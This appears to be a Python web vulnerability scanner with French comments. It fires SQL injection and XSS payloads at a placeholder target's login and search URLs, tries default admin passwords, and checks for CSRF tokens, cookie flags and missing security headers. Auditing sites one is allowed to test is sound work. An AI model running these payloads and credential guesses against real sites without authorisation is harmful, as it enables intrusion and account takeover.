import requests
import random
import csv
import json
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from multiprocessing.dummy import Pool as ThreadPool

# 🔥 Configuration
TARGET_URL = "https//wwwsequetuveut.com"  # Remplace par ton URL cible
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
]

# Stocke les résultats dans un tableau pour export
results = []

# ✅ Fonction pour envoyer des requêtes avec un User-Agent aléatoire
def make_request(url, method="GET", data=None):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        if method == "GET":
            return requests.get(url, headers=headers, timeout=5)
        elif method == "POST":
            return requests.post(url, headers=headers, data=data, timeout=5)
    except requests.RequestException:
        return None

# 🔥 TEST 1: SQL Injection (SQLi)
def test_sqli():
    payloads = ["' OR '1'='1' -- ", "' UNION SELECT NULL,NULL--"]
    for payload in payloads:
        test_url = f"{TARGET_URL}/login?username=admin&password={payload}"
        response = make_request(test_url)

        if response and ("error in your SQL" in response.text.lower() or response.status_code == 500):
            results.append({"type": "SQLi", "url": test_url, "status": "VULNERABLE"})
            print(f"[❌] SQLi Exploitable sur {test_url}")
            return

    print("[✅] Pas de SQLi détecté.")

# 🔥 TEST 2: XSS (Cross-Site Scripting)
def test_xss():
    payloads = ['<script>alert(1)</script>', '" onmouseover="alert(1)"']
    for payload in payloads:
        test_url = f"{TARGET_URL}/search?q={payload}"
        response = make_request(test_url)

        if response and payload in response.text:
            results.append({"type": "XSS", "url": test_url, "status": "VULNERABLE"})
            print(f"[❌] XSS Exploitable sur {test_url}")
            return

    print("[✅] Pas de XSS détecté.")

# 🔥 TEST 3: CSRF
def test_csrf():
    response = make_request(f"{TARGET_URL}/account")
    if response and "csrf_token" not in response.text:
        results.append({"type": "CSRF", "url": TARGET_URL, "status": "VULNERABLE"})
        print(f"[❌] CSRF Exploitable !")
    else:
        print("[✅] Pas de vulnérabilité CSRF.")

# 🔥 TEST 4: Clickjacking (X-Frame-Options)
def test_clickjacking():
    response = make_request(TARGET_URL)
    if response and "X-Frame-Options" not in response.headers:
        results.append({"type": "Clickjacking", "url": TARGET_URL, "status": "VULNERABLE"})
        print(f"[❌] Clickjacking Exploitable !")
    else:
        print("[✅] Clickjacking non exploitable.")

# 🔥 TEST 5: Brute Force (sans spam)
def test_brute_force():
    credentials = [("admin", "admin"), ("admin", "password"), ("admin", "123456")]
    for username, password in credentials:
        response = make_request(f"{TARGET_URL}/login?username={username}&password={password}")
        if response and "Welcome" in response.text:
            results.append({"type": "Brute Force", "url": TARGET_URL, "status": f"Mot de passe trouvé : {password}"})
            print(f"[❌] Brute Force réussi avec {password}")
            return

    print("[✅] Aucune vulnérabilité Brute Force détectée.")

# 🔥 TEST 6: Sécurité des cookies
def test_cookie_security():
    response = make_request(TARGET_URL)
    if response:
        for cookie in response.cookies:
            if not cookie.secure or not cookie.has_nonstandard_attr('HttpOnly'):
                results.append({"type": "Cookie Security", "url": TARGET_URL, "status": "Cookies mal protégés"})
                print("[❌] Cookies mal sécurisés !")
                return

    print("[✅] Cookies sécurisés.")

# 🔥 TEST 7: En-têtes de sécurité
def test_security_headers():
    response = make_request(TARGET_URL)
    if response:
        headers = response.headers
        missing_headers = []
        if 'Strict-Transport-Security' not in headers:
            missing_headers.append("HSTS")
        if 'X-Content-Type-Options' not in headers:
            missing_headers.append("X-Content-Type-Options")
        if 'X-XSS-Protection' not in headers:
            missing_headers.append("X-XSS-Protection")

        if missing_headers:
            results.append({"type": "Security Headers", "url": TARGET_URL, "status": f"Manquants: {', '.join(missing_headers)}"})
            print(f"[❌] Headers de sécurité manquants: {', '.join(missing_headers)}")
        else:
            print("[✅] Tous les headers de sécurité sont présents.")

# 🚀 Lancer les tests en parallèle
def main():
    print("\n--- Lancement des tests de vulnérabilités ---\n")
    tests = [test_sqli, test_xss, test_csrf, test_clickjacking, test_brute_force, test_cookie_security, test_security_headers]
    
    pool = ThreadPool(5)
    pool.map(lambda func: func(), tests)
    pool.close()
    pool.join()

    # 🔄 Sauvegarde des résultats
    with open("audit_results.json", "w") as f:
        json.dump(results, f, indent=4)

    print("\n--- Tests terminés. Résultats enregistrés dans audit_results.json ---")

if __name__ == "__main__":
    main()
